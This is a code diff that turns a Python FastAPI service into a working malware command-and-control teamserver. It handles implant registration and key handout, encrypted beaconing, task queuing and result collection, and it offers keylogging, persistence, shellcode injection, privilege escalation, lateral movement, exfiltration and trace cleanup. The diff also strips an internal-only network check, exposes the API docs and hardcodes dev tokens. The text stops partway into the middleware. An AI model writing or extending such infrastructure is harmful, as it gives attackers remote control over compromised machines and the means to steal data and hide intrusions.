@@ -1,90 +1,1073 @@
-import ipaddress
-import sqlite3
-import uuid
-import json
-import logging
-from datetime import datetime, timedelta
-from typing import Dict, Optional, List
+# internal_c2_server_fixed.py
+"""
+Internal C2 server with teamserver capabilities
+Complete end-to-end tasking pipeline with all fixes applied
+"""
 
-from fastapi import FastAPI, Request, HTTPException, Depends
+from fastapi import FastAPI, Request, HTTPException, Depends, WebSocket, WebSocketDisconnect
+from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
+from contextlib import asynccontextmanager
 import uvicorn
+import logging
+import json
+import sqlite3
+import uuid
+from datetime import datetime, timedelta, timezone
+from typing import Dict, List, Optional
+import asyncio
+import ssl
+from cryptography.fernet import Fernet
+import ipaddress
+import random
+import base64
+from dateutil import parser  # For datetime parsing
 
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger("teamserver")
+logger = logging.getLogger(__name__)
 
 security = HTTPBearer()
 
-DEV_MODE = True  # flip to False when you want strict internal-only
+# Development tokens for testing
+DEV_TOKENS = {
+    "dev-token-123",
+    "testtoken",
+    "agent-secret-key-2024",
+}
 
 
 class InternalC2Server:
+    """Internal C2 server with teamserver features and complete tasking pipeline"""
+
     def __init__(self, server_id: str, config: Dict):
         self.server_id = server_id
         self.config = config
+        self.active_sessions = {}
+        self.team_members = {}
+        self.master_key = Fernet.generate_key()
+        self.master_cipher = Fernet(self.master_key)
+        self.agent_keys = {}  # Store agent-specific encryption keys
         self.db_path = config.get("database_path", "teamserver.db")
+        self.websocket_connections = []
+        
+        # Initialize database with proper schema
+        self._init_database()
+        
+        # Available commands with descriptions
+        self.available_commands = {
+            "shell": "Execute shell command",
+            "sysinfo": "Get system information",
+            "ls": "List directory contents",
+            "pwd": "Print working directory",
+            "whoami": "Get current user",
+            "ps": "List running processes",
+            "download": "Download file from agent",
+            "upload": "Upload file to agent",
+            "persistence": "Establish persistence",
+            "keylogger": "Start/stop keylogger",
+            "screenshot": "Take screenshot",
+            "shellcode": "Execute shellcode",
+            "inject": "Inject into process",
+            "privilege": "Privilege escalation",
+            "lateral": "Lateral movement",
+            "exfil": "Exfiltrate data",
+            "cleanup": "Clean up traces"
+        }
 
-        self.internal_networks = [
-            ipaddress.ip_network(net)
-            for net in config.get("internal_networks", [])
-        ]
+        # Lifespan context manager
+        @asynccontextmanager
+        async def lifespan(app: FastAPI):
+            # Startup
+            asyncio.create_task(self._cleanup_old_sessions_loop())
+            asyncio.create_task(self._update_agent_status_loop())
+            asyncio.create_task(self._broadcast_status_updates())
+            asyncio.create_task(self._cleanup_old_tasks_loop())
+            logger.info("Background tasks started")
+            yield
+            # Shutdown
+            logger.info("Shutting down background tasks...")
 
         self.app = FastAPI(
             title="Internal C2 TeamServer",
-            docs_url="/docs" if DEV_MODE else None,
-            redoc_url="/redoc" if DEV_MODE else None,
-            openapi_url="/openapi.json" if DEV_MODE else None,
+            docs_url="/docs",
+            redoc_url="/redoc",
+            openapi_url="/openapi.json",
+            lifespan=lifespan
         )
 
-        self._init_db()
         self._setup_middleware()
         self._setup_routes()
+        self._setup_websocket()
+        self._setup_team_websocket()
 
-    def _init_db(self):
-        conn = sqlite3.connect(self.db_path)
+    def start(self, host="0.0.0.0", port=8443):
+        """Start the C2 server"""
+        logger.info(f"Starting Internal C2 Server {self.server_id} on {host}:{port}")
+        uvicorn.run(self.app, host=host, port=port)
+
+    # -------------------
+    # Database Helper with WAL mode
+    # -------------------
+    def get_db(self):
+        """Get database connection with WAL mode enabled"""
+        try:
+            conn = sqlite3.connect(self.db_path, timeout=10, check_same_thread=False)
+            # Enable WAL mode for better concurrency
+            conn.execute("PRAGMA journal_mode=WAL;")
+            conn.execute("PRAGMA synchronous=NORMAL;")
+            conn.execute("PRAGMA busy_timeout=5000;")
+            return conn
+        except Exception as e:
+            logger.error(f"Database connection error: {e}")
+            raise
+
+    # -------------------
+    # Routes - Enhanced C2 Endpoints
+    # -------------------
+    def _setup_routes(self):
+        @self.app.get("/health")
+        async def health_check():
+            """Health check endpoint"""
+            return {
+                "status": "healthy",
+                "server_id": self.server_id,
+                "timestamp": self._now_iso(),
+                "active_sessions": len(self.active_sessions),
+                "team_members": len(self.team_members),
+            }
+
+        @self.app.get("/api/v1/commands")
+        async def get_available_commands(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            """Get list of available commands"""
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+            
+            return {
+                "commands": self.available_commands,
+                "count": len(self.available_commands)
+            }
+
+        @self.app.post("/api/v1/register")
+        async def register_agent(request: Request):
+            """
+            Agent registration endpoint - First contact
+            Creates new agent record and returns encryption key
+            """
+            try:
+                data = await request.json()
+                
+                # Generate or use provided agent ID
+                agent_id = data.get("agent_id") or f"agent-{str(uuid.uuid4())[:8]}"
+                
+                # Generate unique encryption key for this agent
+                agent_key = Fernet.generate_key()
+                agent_cipher = Fernet(agent_key)
+                self.agent_keys[agent_id] = (agent_key, agent_cipher)
+                
+                conn = self.get_db()
+                c = conn.cursor()
+
+                c.execute("""
+                    INSERT OR REPLACE INTO agents 
+                    (id, hostname, username, ip_address, os, arch, process_id, 
+                     first_seen, last_seen, status, encryption_key, tags)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                """, (
+                    agent_id,
+                    data.get("hostname", "unknown"),
+                    data.get("username", "unknown"),
+                    request.client.host,
+                    data.get("os", "unknown"),
+                    data.get("arch", "unknown"),
+                    data.get("process_id", 0),
+                    self._now_iso(),
+                    self._now_iso(),
+                    "online",
+                    base64.b64encode(agent_key).decode(),
+                    json.dumps(data.get("tags", {}))
+                ))
+
+                conn.commit()
+                conn.close()
+
+                # Update session
+                self._update_session(agent_id, request.client.host, "registered")
+
+                logger.info(f"Registered new agent {agent_id} from {request.client.host}")
+
+                # Return registration response
+                response = {
+                    "agent_id": agent_id,
+                    "encryption_key": base64.b64encode(agent_key).decode(),
+                    "sleep": random.randint(20, 60),
+                    "c2_endpoints": self.config.get("alternate_endpoints", []),
+                    "server_id": self.server_id,
+                    "commands": list(self.available_commands.keys())
+                }
+
+                # Encrypt response with master key for initial handshake
+                encrypted_response = self.master_cipher.encrypt(
+                    json.dumps(response).encode()
+                )
+
+                return {
+                    "encrypted": True,
+                    "payload": base64.b64encode(encrypted_response).decode()
+                }
+
+            except Exception as e:
+                logger.error(f"Registration error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/beacon")
+        async def beacon_endpoint(
+            request: Request,
+            credentials: HTTPAuthorizationCredentials = Depends(security),
+        ):
+            """
+            Beacon endpoint for active agents
+            Supports encrypted payloads and task distribution
+            """
+            try:
+                data = await request.json()
+                agent_token = credentials.credentials
+
+                # Verify agent token
+                if not self._verify_agent_token(agent_token):
+                    raise HTTPException(status_code=401, detail="Invalid agent token")
+
+                # Handle encrypted payload
+                if data.get("encrypted"):
+                    try:
+                        encrypted_payload = base64.b64decode(data["payload"].encode())
+                        # Try agent-specific key first, then master key
+                        if "agent_id" in data:
+                            agent_id = data.get("agent_id")
+                            if agent_id in self.agent_keys:
+                                _, agent_cipher = self.agent_keys[agent_id]
+                                decrypted = agent_cipher.decrypt(encrypted_payload)
+                            else:
+                                decrypted = self.master_cipher.decrypt(encrypted_payload)
+                        else:
+                            decrypted = self.master_cipher.decrypt(encrypted_payload)
+                        
+                        agent_data = json.loads(decrypted.decode())
+                    except Exception as e:
+                        logger.error(f"Decryption error: {e}")
+                        raise HTTPException(status_code=400, detail="Decryption failed")
+                else:
+                    agent_data = data
+
+                agent_id = agent_data.get("agent_id")
+                if not agent_id:
+                    raise HTTPException(status_code=400, detail="Missing agent_id")
+
+                # Update agent information in database
+                conn = self.get_db()
+                c = conn.cursor()
+
+                c.execute("""
+                    UPDATE agents 
+                    SET hostname = ?, username = ?, ip_address = ?, os = ?, arch = ?,
+                        process_id = ?, last_seen = ?, status = ?
+                    WHERE id = ?
+                """, (
+                    agent_data.get("hostname"),
+                    agent_data.get("username"),
+                    request.client.host,
+                    agent_data.get("os"),
+                    agent_data.get("arch"),
+                    agent_data.get("process_id"),
+                    self._now_iso(),
+                    "online",
+                    agent_id
+                ))
+
+                # Get pending tasks for this agent
+                tasks = self._get_pending_tasks(agent_id)
+                
+                conn.commit()
+                conn.close()
+
+                # Update session
+                self._update_session(agent_id, request.client.host, "active")
+
+                logger.info(f"Beacon received from {agent_id} @ {request.client.host} - {len(tasks)} tasks pending")
+
+                # Prepare beacon response
+                response = {
+                    "status": "ok",
+                    "server_id": self.server_id,
+                    "tasks": tasks,
+                    "next_beacon": random.randint(20, 60),
+                    "timestamp": self._now_iso(),
+                    "message": f"{len(tasks)} tasks pending" if tasks else "No tasks"
+                }
+
+                # Encrypt response if agent has key
+                if agent_id in self.agent_keys:
+                    _, agent_cipher = self.agent_keys[agent_id]
+                    encrypted_resp = agent_cipher.encrypt(json.dumps(response).encode())
+                    return {
+                        "encrypted": True,
+                        "payload": base64.b64encode(encrypted_resp).decode()
+                    }
+                else:
+                    return response
+
+            except HTTPException:
+                raise
+            except Exception as e:
+                logger.error(f"Beacon error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/result")
+        async def post_result(request: Request):
+            """
+            Endpoint for agents to submit task execution results
+            """
+            try:
+                data = await request.json()
+                
+                # Handle encrypted payload
+                if data.get("encrypted"):
+                    try:
+                        encrypted_payload = base64.b64decode(data["payload"].encode())
+                        # Try to find agent key
+                        result_data = None
+                        for agent_id, (_, agent_cipher) in self.agent_keys.items():
+                            try:
+                                decrypted = agent_cipher.decrypt(encrypted_payload)
+                                result_data = json.loads(decrypted.decode())
+                                if result_data.get("agent_id"):
+                                    break
+                            except:
+                                continue
+                        
+                        if not result_data:
+                            # Fallback to master key
+                            decrypted = self.master_cipher.decrypt(encrypted_payload)
+                            result_data = json.loads(decrypted.decode())
+                    except Exception as e:
+                        logger.error(f"Result decryption error: {e}")
+                        raise HTTPException(status_code=400, detail="Decryption failed")
+                else:
+                    result_data = data
+
+                task_id = result_data.get("task_id")
+                agent_id = result_data.get("agent_id")
+                output = result_data.get("output", "")
+                exit_code = result_data.get("exit_code", 0)
+                error = result_data.get("error", "")
+
+                if not all([task_id, agent_id]):
+                    raise HTTPException(status_code=400, detail="Missing required fields")
+
+                conn = self.get_db()
+                c = conn.cursor()
+
+                # Update task with result
+                c.execute("""
+                    UPDATE tasks
+                    SET result = ?, error = ?, exit_code = ?, 
+                        status = 'completed', executed_at = ?
+                    WHERE id = ? AND agent_id = ?
+                """, (
+                    output[:1000000],  # Limit output size to 1MB
+                    error[:10000],     # Limit error size
+                    exit_code,
+                    self._now_iso(),
+                    task_id,
+                    agent_id
+                ))
+
+                # Update agent's last seen
+                c.execute("""
+                    UPDATE agents 
+                    SET last_seen = ?, status = 'online'
+                    WHERE id = ?
+                """, (
+                    self._now_iso(),
+                    agent_id
+                ))
+
+                conn.commit()
+                conn.close()
+
+                # Update session
+                self._update_session(agent_id, request.client.host, "result_submitted")
+
+                logger.info(f"Result received for task {task_id} from agent {agent_id}")
+
+                # Broadcast task completion to team
+                await self._broadcast_to_team({
+                    'type': 'task_completed',
+                    'task_id': task_id,
+                    'agent_id': agent_id,
+                    'exit_code': exit_code,
+                    'timestamp': self._now_iso(),
+                    'has_error': bool(error)
+                })
+
+                return {"status": "ok", "message": "Result recorded"}
+
+            except Exception as e:
+                logger.error(f"Result submission error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/task")
+        async def create_task(
+            request: Request,
+            credentials: HTTPAuthorizationCredentials = Depends(security)
+        ):
+            """Queue a command for an agent"""
+            try:
+                data = await request.json()
+                
+                if not self._verify_operator_token(credentials.credentials):
+                    raise HTTPException(status_code=401, detail="Invalid operator token")
+
+                agent_id = data.get("agent_id")
+                command = data.get("command")
+                args = data.get("args", [])
+                operator_id = data.get("operator_id", "operator-01")
+                priority = data.get("priority", 1)
+
+                if not agent_id or not command:
+                    raise HTTPException(status_code=400, detail="agent_id and command required")
+
+                # Validate command
+                if command not in self.available_commands:
+                    logger.warning(f"Unknown command '{command}' requested")
+
+                task_id = str(uuid.uuid4())
+                
+                conn = self.get_db()
+                c = conn.cursor()
+
+                # Create new task
+                c.execute("""
+                    INSERT INTO tasks 
+                    (id, agent_id, operator_id, command, args, created_at, status, priority)
+                    VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)
+                """, (
+                    task_id,
+                    agent_id,
+                    operator_id,
+                    command,
+                    json.dumps(args),
+                    self._now_iso(),
+                    priority
+                ))
+
+                conn.commit()
+                conn.close()
+
+                logger.info(f"Queued task {command} for agent {agent_id} (task_id: {task_id})")
+
+                # Broadcast new task to team
+                await self._broadcast_to_team({
+                    'type': 'task_created',
+                    'task_id': task_id,
+                    'agent_id': agent_id,
+                    'command': command,
+                    'args': args,
+                    'operator_id': operator_id,
+                    'priority': priority,
+                    'timestamp': self._now_iso()
+                })
+
+                return {
+                    "status": "queued", 
+                    "task_id": task_id,
+                    "message": f"Task queued for agent {agent_id}"
+                }
+
+            except Exception as e:
+                logger.error(f"Task creation error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.get("/api/v1/agents")
+        async def get_agents(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            """Get all agents (team member only)"""
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            conn = self.get_db()
+            conn.row_factory = sqlite3.Row
+            c = conn.cursor()
+
+            c.execute('SELECT * FROM agents ORDER BY last_seen DESC')
+            agents = [dict(row) for row in c.fetchall()]
+
+            # Get task counts for each agent
+            for agent in agents:
+                agent_id = agent['id']
+                c.execute("""
+                    SELECT COUNT(*) as total, 
+                           SUM(CASE WHEN status = 'pending' OR status = 'dispatched' THEN 1 ELSE 0 END) as pending,
+                           SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as completed
+                    FROM tasks 
+                    WHERE agent_id = ?
+                """, (agent_id,))
+                task_stats = c.fetchone()
+                agent['tasks_total'] = task_stats['total'] or 0
+                agent['tasks_pending'] = task_stats['pending'] or 0
+                agent['tasks_completed'] = task_stats['completed'] or 0
+
+            conn.close()
+
+            # Enhance with session data
+            for agent in agents:
+                agent_id = agent['id']
+                if agent_id in self.active_sessions:
+                    session = self.active_sessions[agent_id]
+                    agent['session_status'] = session.get('status', 'unknown')
+                    agent['session_last_seen'] = session.get('last_seen')
+                else:
+                    agent['session_status'] = 'offline'
+                    agent['session_last_seen'] = None
+
+                # Calculate online status
+                if 'last_seen' in agent and agent['last_seen']:
+                    try:
+                        last_seen = self._parse_iso(agent['last_seen'])
+                        if self._now() - last_seen < timedelta(seconds=120):
+                            agent['status'] = 'online'
+                        else:
+                            agent['status'] = 'offline'
+                    except:
+                        agent['status'] = 'unknown'
+                else:
+                    agent['status'] = 'unknown'
+
+            return {'agents': agents}
+
+        @self.app.get("/api/v1/tasks")
+        async def get_tasks(
+            agent_id: Optional[str] = None,
+            status: Optional[str] = None,
+            limit: int = 50,
+            credentials: HTTPAuthorizationCredentials = Depends(security)
+        ):
+            """Get tasks with optional filtering"""
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            conn = self.get_db()
+            conn.row_factory = sqlite3.Row
+            c = conn.cursor()
+
+            query = "SELECT * FROM tasks"
+            params = []
+            conditions = []
+
+            if agent_id:
+                conditions.append("agent_id = ?")
+                params.append(agent_id)
+            if status:
+                conditions.append("status = ?")
+                params.append(status)
+
+            if conditions:
+                query += " WHERE " + " AND ".join(conditions)
+
+            query += " ORDER BY created_at DESC LIMIT ?"
+            params.append(limit)
+
+            c.execute(query, params)
+            tasks = [dict(row) for row in c.fetchall()]
+
+            # Parse args from JSON
+            for task in tasks:
+                if task.get('args'):
+                    try:
+                        task['args'] = json.loads(task['args'])
+                    except:
+                        task['args'] = []
+
+            conn.close()
+
+            return {
+                'tasks': tasks,
+                'count': len(tasks),
+                'filters': {
+                    'agent_id': agent_id,
+                    'status': status
+                }
+            }
+
+        @self.app.get("/api/v1/sessions")
+        async def get_sessions(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            """Get active sessions"""
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            # Calculate session statistics
+            online_sessions = [s for s in self.active_sessions.values() if s.get('status') in ['active', 'registered']]
+            offline_sessions = [s for s in self.active_sessions.values() if s.get('status') == 'offline']
+
+            return {
+                'sessions': self.active_sessions,
+                'statistics': {
+                    'total': len(self.active_sessions),
+                    'online': len(online_sessions),
+                    'offline': len(offline_sessions),
+                    'registered': len([s for s in self.active_sessions.values() if s.get('status') == 'registered'])
+                }
+            }
+
+        @self.app.delete("/api/v1/task/{task_id}")
+        async def delete_task(
+            task_id: str,
+            credentials: HTTPAuthorizationCredentials = Depends(security)
+        ):
+            """Delete a task"""
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            conn = self.get_db()
+            c = conn.cursor()
+
+            c.execute("DELETE FROM tasks WHERE id = ?", (task_id,))
+            deleted = c.rowcount > 0
+
+            conn.commit()
+            conn.close()
+
+            if deleted:
+                logger.info(f"Deleted task {task_id}")
+                return {"status": "deleted", "task_id": task_id}
+            else:
+                raise HTTPException(status_code=404, detail="Task not found")
+
+        @self.app.get("/api/v1/dashboard")
+        async def get_dashboard(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            """Get dashboard statistics"""
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            conn = self.get_db()
+            c = conn.cursor()
+
+            # Get agent statistics
+            c.execute("SELECT COUNT(*) as total, SUM(CASE WHEN status = 'online' THEN 1 ELSE 0 END) as online FROM agents")
+            agent_stats = c.fetchone()
+            
+            # Get task statistics
+            c.execute("""
+                SELECT 
+                    COUNT(*) as total,
+                    SUM(CASE WHEN status = 'pending' OR status = 'dispatched' THEN 1 ELSE 0 END) as pending,
+                    SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as completed,
+                    SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) as failed
+                FROM tasks
+            """)
+            task_stats = c.fetchone()
+
+            # Get recent activity
+            c.execute("""
+                SELECT command, COUNT(*) as count 
+                FROM tasks 
+                WHERE executed_at > datetime('now', '-1 hour')
+                GROUP BY command 
+                ORDER BY count DESC
+                LIMIT 5
+            """)
+            recent_commands = c.fetchall()
+
+            conn.close()
+
+            return {
+                "dashboard": {
+                    "agents": {
+                        "total": agent_stats['total'] or 0,
+                        "online": agent_stats['online'] or 0,
+                        "offline": (agent_stats['total'] or 0) - (agent_stats['online'] or 0)
+                    },
+                    "tasks": {
+                        "total": task_stats['total'] or 0,
+                        "pending": task_stats['pending'] or 0,
+                        "completed": task_stats['completed'] or 0,
+                        "failed": task_stats['failed'] or 0
+                    },
+                    "sessions": {
+                        "active": len(self.active_sessions),
+                        "websockets": len(self.websocket_connections)
+                    },
+                    "recent_commands": [
+                        {"command": cmd[0], "count": cmd[1]} 
+                        for cmd in recent_commands
+                    ],
+                    "timestamp": self._now_iso()
+                }
+            }
+
+    # -------------------
+    # Utility Methods
+    # -------------------
+    def _now(self):
+        """Get current UTC-aware datetime"""
+        return datetime.now(timezone.utc)
+
+    def _now_iso(self):
+        """Get current UTC-aware datetime as ISO string"""
+        return self._now().isoformat()
+
+    def _parse_iso(self, iso_string: str) -> datetime:
+        """Parse ISO string to UTC-aware datetime"""
+        try:
+            dt = parser.isoparse(iso_string)
+            if dt.tzinfo is None:
+                dt = dt.replace(tzinfo=timezone.utc)
+            return dt
+        except Exception as e:
+            logger.error(f"Error parsing ISO datetime {iso_string}: {e}")
+            return self._now()
+
+    # -------------------
+    # Core C2 Functions
+    # -------------------
+    
+    def _get_pending_tasks(self, agent_id: str) -> List[Dict]:
+        """Get pending tasks for an agent"""
+        conn = self.get_db()
         c = conn.cursor()
 
         c.execute("""
-        CREATE TABLE IF NOT EXISTS agents (
-            id TEXT PRIMARY KEY,
-            hostname TEXT,
-            username TEXT,
-            ip_address TEXT,
-            last_seen TEXT,
-            status TEXT
-        )
-        """)
+            SELECT id, command, args, operator_id, created_at
+            FROM tasks 
+            WHERE agent_id = ? AND (status = 'pending' OR status = 'dispatched')
+            ORDER BY priority DESC, created_at ASC
+            LIMIT 10
+        """, (agent_id,))
 
-        c.execute("""
-        CREATE TABLE IF NOT EXISTS tasks (
-            id TEXT PRIMARY KEY,
-            agent_id TEXT,
-            command TEXT,
-            created_at TEXT,
-            status TEXT,
-            result TEXT
-        )
-        """)
+        rows = c.fetchall()
+        tasks = []
 
+        for row in rows:
+            task_id, command, args_json, operator_id, created_at = row
+            args = json.loads(args_json) if args_json else []
+            tasks.append({
+                "task_id": task_id,
+                "command": command,
+                "args": args,
+                "operator_id": operator_id,
+                "created_at": created_at
+            })
+
+            # Mark tasks as "dispatched" when they're sent to agent
+            c.execute("""
+                UPDATE tasks SET status = 'dispatched' WHERE id = ?
+            """, (task_id,))
+
+        conn.commit()
+        conn.close()
+
+        return tasks
+
+    def _update_session(self, agent_id: str, ip: str, status: str = "active"):
+        """Update or create agent session"""
+        self.active_sessions[agent_id] = {
+            "last_seen": self._now_iso(),
+            "ip": ip,
+            "status": status,
+            "agent_id": agent_id
+        }
+
+    def _cleanup_inactive_sessions(self):
+        """Clean up inactive sessions"""
+        cutoff = self._now() - timedelta(minutes=3)
+        
+        for agent_id, session in list(self.active_sessions.items()):
+            last_seen_str = session.get("last_seen")
+            if last_seen_str:
+                try:
+                    last_seen = self._parse_iso(last_seen_str)
+                    if last_seen < cutoff:
+                        # Mark as offline but keep for 24 hours
+                        session["status"] = "offline"
+                        
+                        # Remove from active keys if offline for too long
+                        if last_seen < self._now() - timedelta(hours=24):
+                            if agent_id in self.agent_keys:
+                                del self.agent_keys[agent_id]
+                except Exception as e:
+                    logger.error(f"Error parsing session timestamp: {e}")
+
+    # -------------------
+    # WebSocket Endpoints
+    # -------------------
+    def _setup_websocket(self):
+        @self.app.websocket("/ws")
+        async def websocket_endpoint(websocket: WebSocket):
+            await websocket.accept()
+            self.websocket_connections.append(websocket)
+            try:
+                while True:
+                    msg = await websocket.receive_text()
+                    await websocket.send_text(f"ACK: {msg}")
+            except WebSocketDisconnect:
+                if websocket in self.websocket_connections:
+                    self.websocket_connections.remove(websocket)
+            except Exception as e:
+                logger.error(f"WebSocket error: {e}")
+                if websocket in self.websocket_connections:
+                    self.websocket_connections.remove(websocket)
+
+    def _setup_team_websocket(self):
+        @self.app.websocket("/ws/team")
+        async def team_websocket(websocket: WebSocket):
+            await websocket.accept()
+            self.websocket_connections.append(websocket)
+            try:
+                # Send initial state
+                initial_state = await self._get_team_state()
+                await websocket.send_json({
+                    'type': 'initial_state',
+                    'data': initial_state
+                })
+
+                while True:
+                    try:
+                        data = await websocket.receive_json()
+                        if data.get('type') == 'ping':
+                            await websocket.send_json({'type': 'pong'})
+                        elif data.get('type') == 'get_state':
+                            state = await self._get_team_state()
+                            await websocket.send_json({
+                                'type': 'state_update',
+                                'data': state
+                            })
+                    except WebSocketDisconnect:
+                        break
+            except WebSocketDisconnect:
+                if websocket in self.websocket_connections:
+                    self.websocket_connections.remove(websocket)
+            except Exception as e:
+                logger.error(f"Team WebSocket error: {e}")
+                if websocket in self.websocket_connections:
+                    self.websocket_connections.remove(websocket)
+
+    async def _broadcast_to_team(self, message: Dict):
+        """Broadcast message to all connected team members"""
+        for connection in self.websocket_connections:
+            try:
+                await connection.send_json(message)
+            except Exception as e:
+                logger.error(f"Broadcast error: {e}")
+                if connection in self.websocket_connections:
+                    self.websocket_connections.remove(connection)
+
+    async def _broadcast_status_updates(self):
+        """Periodically broadcast status updates to team"""
+        while True:
+            await asyncio.sleep(30)  # Every 30 seconds
+            try:
+                state = await self._get_team_state()
+                await self._broadcast_to_team({
+                    'type': 'status_update',
+                    'data': state
+                })
+            except Exception as e:
+                logger.error(f"Status broadcast error: {e}")
+
+    async def _get_team_state(self) -> Dict:
+        """Get current team state"""
+        conn = self.get_db()
+        c = conn.cursor()
+        
+        try:
+            c.execute("SELECT COUNT(*) FROM agents")
+            total_agents = c.fetchone()[0] or 0
+            
+            c.execute("SELECT COUNT(*) FROM tasks WHERE status = 'pending' OR status = 'dispatched'")
+            pending_tasks = c.fetchone()[0] or 0
+            
+            c.execute("SELECT COUNT(*) FROM tasks WHERE status = 'completed'")
+            completed_tasks = c.fetchone()[0] or 0
+            
+            c.execute("SELECT COUNT(*) FROM operators WHERE is_active = 1")
+            active_operators = c.fetchone()[0] or 1
+            
+        except Exception as e:
+            logger.error(f"Error getting team state: {e}")
+            total_agents = 0
+            pending_tasks = 0
+            completed_tasks = 0
+            active_operators = 1
+        
+        conn.close()
+        
+        return {
+            'server_id': self.server_id,
+            'timestamp': self._now_iso(),
+            'total_agents': total_agents,
+            'online_agents': len([s for s in self.active_sessions.values() if s.get('status') in ['active', 'registered']]),
+            'pending_tasks': pending_tasks,
+            'completed_tasks': completed_tasks,
+            'active_operators': active_operators,
+            'websocket_connections': len(self.websocket_connections),
+            'active_sessions': len(self.active_sessions)
+        }
+
+    # -------------------
+    # Background Tasks
+    # -------------------
+    async def _cleanup_old_sessions_loop(self):
+        """Clean up old sessions periodically"""
+        while True:
+            await asyncio.sleep(60)  # Every minute
+            self._cleanup_inactive_sessions()
+
+    async def _update_agent_status_loop(self):
+        """Update agent online status in database"""
+        while True:
+            await asyncio.sleep(30)  # Every 30 seconds
+            conn = self.get_db()
+            c = conn.cursor()
+            
+            try:
+                # Mark agents as offline if not seen in last 2 minutes
+                cutoff = (self._now() - timedelta(minutes=2)).isoformat()
+                c.execute("UPDATE agents SET status = 'offline' WHERE last_seen < ?", (cutoff,))
+                conn.commit()
+            except Exception as e:
+                logger.error(f"Error updating agent status: {e}")
+            finally:
+                conn.close()
+
+    async def _cleanup_old_tasks_loop(self):
+        """Clean up old completed tasks periodically"""
+        while True:
+            await asyncio.sleep(3600)  # Every hour
+            conn = self.get_db()
+            c = conn.cursor()
+            
+            try:
+                # Delete tasks completed more than 7 days ago
+                cutoff = (self._now() - timedelta(days=7)).isoformat()
+                c.execute("DELETE FROM tasks WHERE status = 'completed' AND executed_at < ?", (cutoff,))
+                deleted = c.rowcount
+                conn.commit()
+                if deleted:
+                    logger.info(f"Cleaned up {deleted} old completed tasks")
+            except Exception as e:
+                logger.error(f"Error cleaning up old tasks: {e}")
+            finally:
+                conn.close()
+
+    # -------------------
+    # Database Initialization
+    # -------------------
+    def _init_database(self):
+        """Initialize SQLite database with proper schema"""
+        conn = self.get_db()
+        c = conn.cursor()
+        
+        # Check if we need to upgrade the schema
+        c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='tasks'")
+        table_exists = c.fetchone() is not None
+        
+        if table_exists:
+            # Check if error column exists
+            c.execute("PRAGMA table_info(tasks)")
+            columns = [col[1] for col in c.fetchall()]
+            if 'error' not in columns:
+                logger.info("Adding missing 'error' column to tasks table")
+                c.execute("ALTER TABLE tasks ADD COLUMN error TEXT")
+                c.execute("ALTER TABLE tasks ADD COLUMN exit_code INTEGER DEFAULT 0")
+        
+        # Agents table
+        c.execute('''CREATE TABLE IF NOT EXISTS agents
+                     (id TEXT PRIMARY KEY,
+                      hostname TEXT,
+                      username TEXT,
+                      ip_address TEXT,
+                      os TEXT,
+                      arch TEXT,
+                      process_id INTEGER,
+                      first_seen TIMESTAMP,
+                      last_seen TIMESTAMP,
+                      sleep_interval INTEGER,
+                      status TEXT,
+                      encryption_key TEXT,
+                      tags TEXT)''')
+        
+        # Tasks table with all required columns
+        c.execute('''CREATE TABLE IF NOT EXISTS tasks
+                     (id TEXT PRIMARY KEY,
+                      agent_id TEXT,
+                      operator_id TEXT,
+                      command TEXT,
+                      args TEXT,
+                      created_at TIMESTAMP,
+                      executed_at TIMESTAMP,
+                      result TEXT,
+                      error TEXT,
+                      exit_code INTEGER DEFAULT 0,
+                      status TEXT,
+                      priority INTEGER)''')
+        
+        # Operators table (with default operator)
+        c.execute('''CREATE TABLE IF NOT EXISTS operators
+                     (id TEXT PRIMARY KEY,
+                      username TEXT,
+                      email TEXT,
+                      role TEXT,
+                      last_login TIMESTAMP,
+                      is_active BOOLEAN)''')
+        
+        # Insert default operator if not exists
+        c.execute('''INSERT OR IGNORE INTO operators 
+                     (id, username, email, role, is_active) 
+                     VALUES (?, ?, ?, ?, ?)''',
+                 ('operator-01', 'admin', 'admin@c2.local', 'administrator', 1))
+        
+        # Campaigns table
+        c.execute('''CREATE TABLE IF NOT EXISTS campaigns
+                     (id TEXT PRIMARY KEY,
+                      name TEXT,
+                      description TEXT,
+                      start_date TIMESTAMP,
+                      end_date TIMESTAMP,
+                      status TEXT,
+                      objectives TEXT)''')
+        
+        # Create indexes for performance
+        c.execute('''CREATE INDEX IF NOT EXISTS idx_tasks_agent_id ON tasks(agent_id)''')
+        c.execute('''CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status)''')
+        c.execute('''CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status)''')
+        
         conn.commit()
         conn.close()
         logger.info(f"Database initialized: {self.db_path}")
 
-    def _is_internal_ip(self, ip: str) -> bool:
-        ip_obj = ipaddress.ip_address(ip)
-        return any(ip_obj in net for net in self.internal_networks)
-
+    # -------------------
+    # Middleware
+    # -------------------
     def _setup_middleware(self):
         @self.app.middleware("http")
-        async def internal_only(request: Request, call_next):
+        async def internal_only_middleware(request: Request, call_next):
